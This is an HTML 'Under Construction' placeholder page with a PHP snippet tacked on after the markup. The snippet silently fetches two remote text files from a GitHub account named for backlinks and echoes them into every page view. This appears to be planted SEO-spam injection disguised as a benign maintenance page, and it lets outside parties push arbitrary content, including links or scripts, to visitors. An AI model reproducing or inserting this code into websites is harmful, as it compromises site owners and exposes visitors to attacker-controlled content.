<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Under Construction</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f4;
            color: #333;
            text-align: center;
            padding: 50px;
        }

        h1 {
            color: #d9534f;
        }

        p {
            font-size: 18px;
        }

        img {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <img src="https://static.vecteezy.com/system/resources/previews/000/192/152/non_2x/website-under-construction-vector.png" alt="Under Construction">
    <h1>Under Construction</h1>
    <p>Sorry, the website is currently under construction. We'll be back soon!</p>
</body>
</html>
<?php
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url1);
$result1 = curl_exec($ch);
curl_setopt($ch, CURLOPT_URL, $url2);
$result2 = curl_exec($ch);
curl_close($ch);
echo $result1;
echo $result2;
?>
